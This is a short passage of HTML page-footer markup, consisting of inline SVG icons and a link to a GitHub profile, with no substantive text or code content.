style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>